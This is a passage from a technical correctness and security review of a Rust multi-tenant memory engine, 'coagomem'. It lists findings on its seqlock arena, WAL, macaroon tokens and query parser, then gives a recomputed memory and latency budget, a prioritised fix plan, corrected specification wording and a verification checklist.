  An agent receiving that fd can map it `PROT_WRITE` and overwrite any tenant's slots. §8.3 says "The engine arena remains private", so the P0 constructor contradicts the specification.

**Correction.**

- Use `OwnedFd` and `BorrowedFd<'_>` everywhere.
- Delete the agent-sharing path from `new_hugetlb`, or return only a sealed read-only reopen.
- Check every `fcntl` result.

#### R5-A1 (Medium): the reviewed arena stores incarnations but never checks them on read

**Problem.** `install` writes `incarnation_lo/hi`, but `read(h, tenant: u32, …)` authorises on the dense u32 only. Its signature cannot even accept an incarnation (EXEC, `r5_defect_a1`). Generation tags prevent handle reuse, but not a request from a stale authenticated incarnation that maps to the same dense index.

**Correction.** Add `expect_inc: u128` to `read` and compare it inside the seqlock-validated snapshot.

#### R5-A2 (Medium): `CoreControl` lives in private heap memory

**Problem.** P0 `SlotArena.cores: Vec<CoreControl>` (holding `durable_lsn` and `engine_epoch`) lives in the engine heap, not in the shared region. Its own doc comment says "Per-core durability watermark, exported read-only to agents" (`slot.rs:212`), but `cores: Box<[CoreControl]>` (`slot.rs:311`) is outside the mapped region. Any cross-process reader therefore cannot evaluate `Visibility::Durable` or detect an engine-epoch change. No code writes `engine_epoch`.

**Correction.** Place `CoreControl[]` in the export or shared header, or publish durable watermarks into export windows.

#### R5-A3 (Low): `WordsMut` can write outside the seqlock

`seqlock.rs` `WordsMut::new` is public, and `set(&self)` writes through a shared reference. Code can write payload words without opening the seqlock, so readers accept inconsistent snapshots. This is not undefined behaviour, but it is a logic hole. Make `new` `pub(crate)` and have only `WriteGuard` hand out `&mut WordsMut`.

#### R5-A4 (Medium, maintainability): duplicate type families

Two `SeqWord`/`read_deadline`/`ReadError` sets, two `SlotArena`, `SlotHandle`, `ExtentLoc` (with different bit layouts) and `SlotHeader` types (64 B vs 128 B) exist. The fixes land in one and integration in the other, which is how R5-A1, R5-A2 and R5-I1 arose.

**Correction.** Pick the P0 family (it is the one wired to lifecycle, WAL and io_uring), port the incarnation header and the deadline reader into it, delete the reviewed arena, and keep its tests. No new crate is needed.

#### R5-O1 (Medium): flow control has no control lane and no idempotent credit accounting

**Problems.**

- `OutboundFlow` credits are deltas. A duplicated ack inflates credits up to the cap; the lane's own capacity check prevents overflow, but accounting drifts.
- Votes, decisions and credit returns share data lanes. With a full data lane in both directions, control messages cannot progress (§4.2 recognises the risk, but no mechanism exists).

**Correction.**

- Credits as a cumulative consumed index (`acked_upto: u64`), which makes duplicates idempotent.
- A separate, reserved control ring per core pair, sized for the maximum number of in-flight transactions.

#### R5-V1 (Low): conflicting ballots are reported as `Duplicate`

A participant that votes Yes then No receives `Duplicate`, and the conflict is invisible. Return `Conflict` and raise an alarm; in a deterministic system this indicates a bug or corruption.

#### R5-S1 (Low): equal-LSN writes are accepted

`slot.rs:543` rejects only `lsn < current`. A replay that re-applies a non-idempotent `+=` record at the same LSN double-applies it. Either require `lsn > current` per record, or encode a sub-sequence.

#### R5-L2 (Low): `assert!` in the CQE path can abort a core

Completion handling contains panic paths: `assert!(m.pins > 0)` (`lifecycle.rs:670`) and `unreachable!()` when the slot state does not match in `on_load_cqe` (about L511). Under `panic = "abort"`, any path that reaches them with an unexpected or duplicated CQE aborts the whole core. Whether a stale CQE can reach them depends on the ticket check ordering, which was not exhaustively traced. Count, log and fence the slot instead.

#### R5-C1 (Low): `KeyEpoch` equality invalidates all tokens on rotation

The equality check gives no overlap window, so every token dies at a key rotation. Accept `epoch ∈ {current, previous}` during a bounded overlap, with a separate per-epoch root key.

#### R5-C2 (Medium): no replay protection or audience binding

**Problems.**

- Macaroons have no `jti`/nonce, audience or protocol binding beyond the domain string.
- `PeerUid` binds only local Unix-socket peers; it is meaningless for remote agents and weak when many agents share a UID.
- The [macaroons paper (NDSS 2014)](https://www.ndss-symposium.org/ndss2014/ndss-2014-programme/macaroons-cookies-contextual-caveats-decentralized-authorization-cloud/) relies on contextual caveats for exactly this.

**Correction.** Add `Audience(service_id)` and `Session(session_id)` caveats and a short expiry. Use third-party caveats for the user channel.

#### R5-C3 (Low): ref-token existence oracle and missing lifecycle fields

- `resolve_ref` returns `NotFound` before computing the MAC, which gives an id-existence oracle. Return one error for both cases.
- There is no expiry, session binding or revocation.
- `blake3_256` is caller-supplied, and there is no BLAKE3 dependency in the workspace. Rename it `digest` and document its producer.

#### R5-B1 (High gate, missing evidence): no storage qualification path

**Problems.**

- No code opens the log or extent files, so there is no `O_DIRECT`, no `STATX_DIOALIGN` check and no device write-cache or FUA verification.
- `O_DIRECT` "does not give the guarantees of the O_SYNC flag", and alignment rules "vary by filesystem and kernel version"; since 6.1 they can be queried with `STATX_DIOALIGN` ([open(2)](https://man7.org/linux/man-pages/man2/open.2.html)).
- `RWF_DSYNC` is "a per-write equivalent of the O_DSYNC open(2) flag" applying "only to the data range written" ([pwritev2(2)](https://man7.org/linux/man-pages/man2/pwritev2.2.html)). Whether that becomes FUA or flush+write depends on the device's volatile write cache ([NVMe NVM Command Set 1.1](https://nvmexpress.org/wp-content/uploads/NVM-Express-NVM-Command-Set-Specification-Revision-1.1-2024.08.05-Ratified.pdf)).
- The SimIo model tears only on 4 KiB prefixes; it does not model sub-block tearing, reordering, lost writes or misdirected writes.

**Exit criteria.**

- A boot qualification that opens the files with `O_DIRECT`, checks `STATX_DIOALIGN`, reads `/sys/block/*/queue/write_cache` and `fua`, and refuses writeback-cache devices without FUA.
- ALICE-style crash-state exploration ([Pillai et al., OSDI 2014](https://www.usenix.org/conference/osdi14/technical-sessions/presentation/pillai)).
- Power-cut tests on the target SSD model.

#### R5-G1 (Medium): the shipped tests hide defects

- The grid test has no timeout and hangs (R5-M1).
- `s5_restart_does_not_reuse_incarnations` codifies R5-T1.
- The torn-tail test codifies R5-T3's boot block as desired behaviour.
- `lifecycle::tests::load_validates_image_and_falls_back_to_other_copy` codifies R5-L1's silent fallback to the older copy as desired behaviour.
- My earlier report of "56 passing tests" came from a lucky schedule of the flaky grid test. It is not evidence of the mesh fix.

**Correction.** Add per-test timeouts (for example `cargo nextest` with `slow-timeout`), invert the codifying tests, and run the grid test 1,000 times in CI.

#### R5-G2 (Info): the Miri statement is outdated

§13.2 says Miri was "not run … no nightly toolchain". In this review Miri passed:

- `coagomem-ql` (8 tests);
- `coagomem-core` `seqlock` tests (3 tests);
- `r5_defect_m1`.

A full core-library run under Miri (excluding the grid and seqlock tests) passed `envelope::tests` (3 tests), `lifecycle::tests::crash_recovery_load_picks_newest_valid_copy` and `load_validates_image_and_falls_back_to_other_copy`. It was then stopped after more than 25 minutes inside `randomized_interleavings_never_lose_or_mix_state`, so the remaining tests are unassessed. Miri explores only some weak-memory behaviours ([Miri](https://github.com/rust-lang/miri/)), so these passes do not replace loom.

`cargo check --target aarch64-unknown-linux-gnu --workspace --all-targets` succeeded. That is a type check only; it does not test aarch64 behaviour.

### 2.3 Areas inspected with no defect found (and the limits of that conclusion)

- **Seqlock ordering** (`seqlock.rs`, `lib.rs`).
  - Writer: CAS(Acquire) then `fence(Release)`, relaxed atomic payload stores, then `store(even, Release)`.
  - Reader: `load(Relaxed)` then `fence(Acquire)`, relaxed payload loads, `fence(Acquire)`, then the re-check.

  This matches Boehm's correct fence-based "version 3" for C++11-style models ([Boehm, MSPC 2012](https://dl.acm.org/doi/10.1145/2247684.2247688)) and the [Rust atomics model](https://doc.rust-lang.org/std/sync/atomic/index.html). Payloads are 8-byte atomics, so there is no data race. Sequence numbers are u64 and do not realistically wrap. Limits: no loom run; the ARM64 analysis is by memory-model equivalence, not hardware.
- **Mesh Dekker parking** (SeqCst fences on both sides) is correct as a protocol, apart from R5-M1, which is a drain-logic bug rather than a fence bug.
- **WAL record recovery.** Magic, CRC, lap, epoch and `lsn == prev+1` checks stop at torn or stale suffixes correctly. Retrying failed writes from retained buffers avoids the fsyncgate trap.
- **Vote-table ABA.** Single-owner `&mut`, tagged slots and stale/duplicate rejection are correct for in-process use.
- **Macaroon chain.** Length-framed domains, a per-caveat HMAC chain, unknown-caveat rejection (`r5_ok_unknown_caveat_rejected`), mandatory caveats, conjunctive semantics and constant-time comparison through `subtle` are all sound.
- **CiaQL tokenizer.** It consumes all input, rejects non-ASCII outside strings, rejects non-finite floats, and handles `i64::MIN` and hex overflow. The §10 example parses (`r5_ok_spec_example…`). For the current grammar, `referenced_actors` covers every place an actor id can appear, apart from `Call` arguments (R5-Q2).

---

## 3. Review of previous remediation

| Claimed fix | Classification | Evidence |
|---|---|---|
| Parser replaced with typed lexer/parser | Partially fixed | Sound tokenizer, but see R5-Q1, R5-Q2, R5-Q3, R5-Q4 and R5-Q5 |
| S1 foreign reads and fleet scans | Bypassable | R5-P2 (tenant operator scans the fleet); R5-Q6 (no type state); R5-A1 (arena read ignores incarnation) |
| S2 foreign actors in raw bodies | Correct and covered (parser path) | Typed paths; residual risk through `Call` arguments (R5-Q2) |
| S3 argument smuggling and `top_k` | Correct and covered | Existing tests; result-byte budget is still missing (executor) |
| S3b vector and metric preserved | Partially fixed | Vectors capped at 256 dimensions (R5-Q1) |
| S3c/S3d stage split and TAKE/EXPORT | Correct and covered | Existing tests |
| S4 S3 prefix rules | Partially fixed | Correct boundaries, but R5-P1 (root rule), R5-P4 (no adapter or owner condition; global rules) |
| S5 incarnation reuse | Bypassable | R5-T2 (journal rollback re-issues), R5-T1 (orphaning codified as the fix), R5-T3 (boot block invites journal deletion) |
| S6 forgeable endorsements | Bypassable | R5-F1 (forgeable labels), R5-F2 and R5-F3 (replay; side effects), R5-F4 (symmetric key) |
| S6b unsigned caveats | Correct and covered | Chain and mandatory caveats; gaps are R5-C1 and R5-C2 (rotation, replay, audience) |
| S7 reader aliasing | Correct and covered | 128-bit explicit readers; capped at 4; heap-allocated (budget, section 4) |
| S8 ARX PRF replaced | Correct and covered | RFC 4231 KAT; vendored crates with an archive SHA-256 manifest (provenance check not re-run against upstream) |
| S9/S10 deadline and poison | Partially fixed | Deadline readers used in both arenas; `Instant` clock; `WriterStalled` semantics correct |
| S11 overflow and credits | Partially fixed | Hard bound holds; R5-O1; and the lane layer beneath it has R5-M1 |
| S12 linear dirty scans | Incorrectly fixed (contract) | O(1) structure correct; the truncation contract is unsafe (R5-D1) |
| Vote-slot ABA | Correct and covered | Conflicting ballots invisible (R5-V1) |
| Export budgets | Partially fixed | Budget correct; self-test vacuous (R5-X1); raw fds (R5-X2) |
| Durable/fenced WAL acks | Not claimed, but affected | R5-W1 |

---

## 4. Independent memory budget and per-path latency

### 4.1 Memory budget, for a 16 GiB node with 1M registered tenants and 14 reactor cores

Distinguishing populations:

| Population | Count | Cost driver |
|---|---|---|
| Registered tenants | 1,000,000 | Route entry, identity map, dirty-list node |
| Resident actors | R (planning value 10–30%: 100k–300k) | Slot header, class rounding, payload |
| Sessions | S (at most 16,384 export windows) | Window, fds, VMAs, labels |
| Active transactions | T (bounded by the vote table and control lane) | Vote slot, mesh messages |

Measured sizes (EXEC, `r5_sizes`):

| Type | Size |
|---|---|
| `Label` | 40 B, plus a heap `Vec<u128>` |
| `VerifiedMacaroon` | 32 B |
| `Endorsement` | 64 B |
| `RefToken` | 24 B |
| `VaultLoc` | 56 B |
| Reviewed `SlotHeader` | 128 B |
| P0 `SlotHeader` | 64 B |
| P0 `RouteEntry` | 16 B |
| `MeshMsg` | 64 B |
| P0 `CoreControl` | 256 B |

Independent calculation:

| Item | Specification | Independent figure | Notes |
|---|---:|---:|---|
| Physical RAM | 16,384 MiB | 16,384 | — |
| `struct page` memmap, outside MemTotal | not counted | about 113–256 MiB | 4,194,304 pages × 64 B = 256 MiB. HVO can free 7 of 8 vmemmap pages per 2 MiB HugeTLB page ([kernel docs](https://docs.kernel.org/mm/vmemmap_dedup.html)): 5,216 × 28 KiB ≈ 143 MiB saved. This comes out of the 820 MiB contingency before any allocation. |
| Kernel image, firmware, crashkernel | inside 2,048 | unmeasured | Measure `MemTotal` on the target |
| Route table | 30.52 MiB (32 B entries) | **15.26 MiB** (P0 16 B) or 30.52 MiB (32 B) | The specification and P0 disagree |
| Tenant identity map (`HashMap<u64,(String,String,u128)>`) | not counted | **about 150 MiB** | About 80 B entry + about 1 B control at 7/8 load + two heap strings (≥32 B glibc chunks each), roughly 155 B × 1M. Lands in the 512 MiB control heap. |
| Dirty lists | 22.89 MiB | 22.89 MiB if partitioned; **320 MiB** if each core runs `TruncationPins::new(1M)` | API takes a dense count; partitioning is unspecified |
| Slot headers (resident) | "before headers" | R × 64 B (P0): 6.1–18.3 MiB at R = 100k–300k; 61 MiB at R = 1M. Double for the 128 B header | — |
| Stranded hugepages | 448 MiB | 448 MiB | 16 classes × 14 cores × 2 MiB |
| Class rounding (power-of-two classes) | not counted | up to 50% worst case, about 25% typical for uniform sizes | Workload-dependent; needs a size histogram |
| Effective all-resident payload | 10.68 KiB/tenant | **about 7.5–8 KiB** | (10,432 − 448 − 61) MiB / 1M ≈ 10.2 KiB, then minus about 25% rounding |
| Mesh | inside 524 | 17.07 MiB (code comment, 17 × 16 rings) | Fixed at boot |
| WAL buffers | inside 524 | `buf_bytes × buffers × cores`, for example 1 MiB × 8 × 14 = 112 MiB | Not itemised |
| Export windows | 64 MiB | 64 MiB of shmem + about 25 MiB kernel objects (file, inode, dentry ≈ 1.5 KiB each × 16,384, estimate) + 2 engine fds each = 32,768 fds | `RLIMIT_NOFILE` ≥ 40k; VMAs at least 16,384, under the default `vm.max_map_count` of 65,530 |
| Labels | "variable" | 40 B + reader `Vec` (16 B/reader, ≥32 B chunk) ≈ **72–120 B per labelled value**; `join` allocates on every call | 4–7× the old 17 B assumption |
| io_uring registered buffers | inside 2,048 | Arena pages pinned and charged to `RLIMIT_MEMLOCK` unless `CAP_IPC_LOCK`; needs a memlock limit ≥ the arena (10.2 GiB) | Up to 1 GiB per registered buffer (code assumption) |
| Page tables | inside 2,048 | Arena PMDs ≈ 41 KiB; agent processes' 4 KiB mappings scale with sessions | Small |

**Conclusion.** The 820 MiB contingency is largely consumed before steady state by:

- memmap (113–256 MiB);
- the identity map (about 150 MiB of the 512 MiB control heap);
- possibly 300 MiB of unpartitioned dirty lists;
- unitemised WAL buffers (about 112 MiB).

The 1M-resident case delivers about 7.5–8 KiB of usable payload per tenant, not 10.68 KiB. The budget is plausible only at the stated 10–30% residency, and only after a boot-time allocator enforces the itemised regions.

### 4.2 Per-path latency (analytical; no measurements on target hardware)

| Path | Target / claim | Dominant costs | Assessment |
|---|---|---|---|
| Local seqlock read | sub-µs | 1 vDSO clock read (`Instant`) + payload loads + 2 Acquire fences; [vdso(7)](https://man7.org/linux/man-pages/man7/vdso.7.html) avoids a syscall when the clocksource supports it | Achievable on TSC hosts. On VMs whose clocksource lacks vDSO support, each read pays a syscall; boot must qualify the clocksource (§11.2) |
| Large-payload read during a write | — | A 64 KiB copy with 8 B atomics ≈ 8,192 loads (a few µs) | A 1 µs stall threshold will often report `WriterStalled` for large classes; size it per class |
| Export publish / read | not specified | Copy into the window + seqlock; agent reads relaxed atomics | Unmeasurable; no publication service |
| Cross-core message | not specified | SPSC lane + doorbell + optional `MSG_RING` wake | Currently unbounded (R5-M1); after the fix, a parked consumer pays the wake latency |
| Cold load | 250 µs | NVMe 4 KiB random read (tens to about 100 µs) + CRC + install | Plausible on enterprise NVMe; R5-L1 must fail closed rather than slowly retry |
| Durable commit | 50 µs p99 | Group-commit delay (`max_delay_ns`) + `RWF_DSYNC` write; FUA cost depends on the device cache | Plausible only with power-loss-protected NVMe; consumer drives with volatile caches can take milliseconds. Needs device qualification (R5-B1) |
| WAN / replicated | not supported | Consensus RTT | Correctly withdrawn as a guarantee (§11) |

---

## 5. Prioritised implementation plan

### P0: correctness fixes (no new crates)

| # | Fix | Depends on | Acceptance criterion |
|---|---|---|---|
| 1 | R5-M1 drain re-check (patch supplied) | — | `r5_defect_m1` fails; grid test passes 1,000/1,000 with a timeout; loom model of 1P/1C, budgets 1–3, 3 flushes passes |
| 2 | R5-D1 `on_checkpointed(t, image_lsn)` | — | Inverted r5 test; DST property "no truncation past an LSN absent from image and log" over 10⁵ seeds |
| 3 | R5-W1 indeterminate acks; stop publishing durable after a fence | — | Inverted `r5_wal`; fenced core rejects reads |
| 4 | R5-I1 incarnation + tombstone in the image header; `validate(expect_inc)` | Format version bump | Delete/recreate crash sweep: no stale install |
| 5 | R5-L1 fail closed on a current-copy failure unless the WAL covers the older LSN | 2 | Corruption test gives `NeedsRepair` |
| 6 | R5-T1/T2/T3 persistent identity map, rollback detection, truncate unacked tail | — | Inverted r5 T-tests; restore of an old journal refused |
| 7 | R5-F1/F2/F3 private label fields; endorsement bound to digest, field, session, nonce and sink | — | Inverted r5 F-tests; trybuild compile-fail |
| 8 | R5-P2 separate fleet capability | — | Inverted r5 P2 test |
| 9 | R5-Q4 iterative depth check; R5-Q2 function allowlist; R5-Q3 MACed ref literal | — | Inverted r5 Q-tests; 24 h cargo-fuzz run on `parse` and `validate_query_ast` without crashes ([Rust Fuzz Book](https://rust-fuzz.github.io/book/cargo-fuzz.html)) |

### Pre-release integration

- Unify on the P0 type family (R5-A4); port incarnation checks (R5-A1); move `CoreControl` to shared memory (R5-A2).
- Reactor, sequencer and WAL replay with a `ValidatedQuery` type state (R5-Q6).
- Separate control lane and cumulative credits (R5-O1).
- Export self-test rewritten to probe the RW-reopen path, citing commit 8ec396d05d1b (R5-X1); `OwnedFd` everywhere (R5-X2).
- Destination adapter using `openat2(RESOLVE_BENEATH | RESOLVE_NO_SYMLINKS)` and the S3 bucket-owner condition (R5-P4).
- Acceptance: one end-to-end request (authenticate, parse, validate, execute, WAL, ack, replay) runs under deterministic simulation with fault injection.

### Production qualification

- Boot qualification of memory, fds, memlock, clocksource, `STATX_DIOALIGN` and device FUA/write cache (R5-B1).
- Crash and power-cut testing (ALICE-style state exploration plus physical power cuts on the target SSD).
- [Elle](https://github.com/jepsen-io/elle) history checking for the claimed isolation level.
- Deterministic simulation in the style of [FoundationDB](https://apple.github.io/foundationdb/engineering.html) or [TigerBeetle VOPR](https://github.com/tigerbeetle/tigerbeetle/blob/main/docs/internals/vopr.md).
- p99 latency on target hardware for every row of section 4.2.
- Measured `MemTotal` and a slab budget.

### Optional improvements

- Asymmetric endorsement signatures (R5-F4).
- Epoch overlap windows (R5-C1).
- Audience and session caveats (R5-C2).
- `Conflict` ballots (R5-V1).
- Calibrated TSC clock.

---

## 6. Exact specification corrections

| Section | Current text | Replacement |
|---|---|---|
| §4.2 | "P0 provides real producer/consumer SPSC lanes and doorbell coordination." | "P0 provides SPSC lanes and doorbell coordination. Version 3.0 contained a stranded-message defect in `drain_lane` (R5-M1); lanes are qualified only after the re-check fix and loom/Shuttle liveness models pass." |
| §1.1, S12 | "Monotonic per-core LSN contract enforced" | "O(1) first-dirty FIFO. Truncation safety requires `on_checkpointed(tenant, image_lsn)` to retain any tenant whose applied LSN exceeds the image LSN." |
| §5 | "Incomplete or corrupt tails fail closed on attach." | "An unacknowledged suffix after the last valid synced record is truncated and audited; corruption before it fails closed. Journal rollback relative to the WAL-superblock high-water mark fails closed." |
| §5 | "Never delete or rewind this journal independently of identity history" | "The engine detects and refuses a rewound or replaced journal; incarnation derivation includes a journal UUID and an externally monotonic generation." |
| §8.1 | "Fleet scans require operator scope." | "Fleet operations require a fleet capability issued under a separate root key; tenant-scoped operator tokens are confined to their tenant." |
| §8.3 | "verifies that the read-only mapping cannot gain shared write permission" | "verifies that a read-only mapping obtained from a write-capable reopen of the sealed memfd cannot gain write permission (the regression fixed by upstream commit 8ec396d05d1b; the CVE identifier formerly cited is rejected in NVD)." |
| §9 | "Endorsement MACs bind tenant, source categories and expiry." | "Endorsements bind tenant, content digest, frame field, session, single-use nonce, authorised sink and expiry. Labels are constructed only by engine provenance constructors and cannot be modified by callers." |
| §10 | "Unknown stages, malformed values, duplicate arguments … are errors." | Keep, and add: "Function names are resolved against an allowlist; `$ref` literals carry the token MAC; vector literals are bounded by `MAX_VECTOR_DIMS`, not `MAX_LIST`; programmatic ASTs are depth-checked iteratively before validation." |
| §3.1 | "A 16 GiB node contains 16,384 MiB." | "A 16 GiB node exposes less than 16,384 MiB to the OS (memmap, firmware and kernel reservations). The budget starts from measured `MemTotal`." |
| §3.1 | "One million 32-byte route entries" | "Route entries are 16 B in P0 (15.26 MiB for 1M) and 32 B in the reviewed design; the deployed layout determines the budget. Include about 150 MiB for the tenant identity map." |
| §13.1 | "Journal tests check restart non-reuse" | "Journal tests check that counters are not reused across restart. They currently also assert that a live tenant receives a new incarnation after restart, which is a defect pending a persistent identity map." |
| §13.2 | "Not run for this revision; no nightly toolchain installed in this environment" | "Miri passed for `coagomem-ql`, the core seqlock, envelope and two lifecycle tests, and the mesh reproduction; the randomized lifecycle test, the remaining core tests and loom/Shuttle models are outstanding." |

---

## 7. Final verification checklist

### Checkable now, with the supplied source

- [x] Seqlock fence pattern matches Boehm version 3 (inspection, Miri subset).
- [x] R5-M1 reproduced, and the fix verified (20/20 runs, deterministic test).
- [x] R5-D1, R5-W1, R5-I1, R5-T1/T2/T3, R5-F1/F2/F3, R5-P1/P2/P3, R5-Q1–Q5, R5-X1 and R5-A1 reproduced by tests in the harness.
- [x] aarch64 type check passes.
- [ ] Apply the P0 fixes and invert every `r5_defect_*` test.
- [ ] Full core Miri run. The randomized lifecycle test alone exceeded 25 minutes; give it a Miri-specific iteration count via `cfg(miri)`.
- [ ] loom models for mesh (1P/1C, budget and flush interleavings), seqlock (1W/1R) and the export publication protocol.
- [ ] cargo-fuzz on `parse`, `validate_query_ast` and `destination_allowed`.
- [ ] `clippy -D warnings` clean (VERIFICATION.md reports it fails).

### Needs more source

- Reactor, sequencer, replay, server, transport, session manager, executor and storage adapter: required to assess S1 end-to-end, R5-D1 call order, R5-P3 frame resolution, R5-O1 and every latency path.
- The deployment's dense-index partitioning (dirty-list budget) and tenant-map persistence design.
- Upstream provenance verification of the vendored crates against crates.io checksums.

### Needs hardware or a deployed system

- Device FUA and write-cache behaviour, `STATX_DIOALIGN`, and power-cut durability on the target SSD.
- p99 for local read, cold load and durable commit on target CPUs (x86 and ARM64) and clocksources.
- Measured `MemTotal`, slab, page-table and memlock usage at 1M tenants, 16,384 windows and the planned residency.
- Elle-checked isolation histories and failover, backup and PITR drills once replication exists.
- Kernel seal-regression probe (R5-X1, corrected) on every supported kernel build.
